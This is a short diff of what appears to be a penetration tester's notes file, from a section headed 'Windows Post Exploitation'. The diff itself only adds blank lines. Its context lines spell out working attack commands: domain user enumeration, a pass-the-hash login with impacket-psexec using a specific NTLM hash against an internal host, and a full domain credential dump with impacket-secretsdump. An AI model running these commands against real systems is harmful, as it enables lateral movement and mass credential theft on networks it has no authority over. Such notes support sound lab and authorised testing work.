@@ -179,9 +179,11 @@ Windows Post Exploitation:
 	net user ashlie.gwenette /domain
 	
 Pass the hash:
+	
 	impacket-psexec -no-pass -hashes :3120f299755272e11e898989265a2196 captaincrunch/blee@10.10.30.10
 	
 Domain Dump:
+	
 	impacket-secretsdump -no-pass -hashes :3120f299755272e11e898989265a2196 captaincrunch/blee@10.10.30.10
 
 
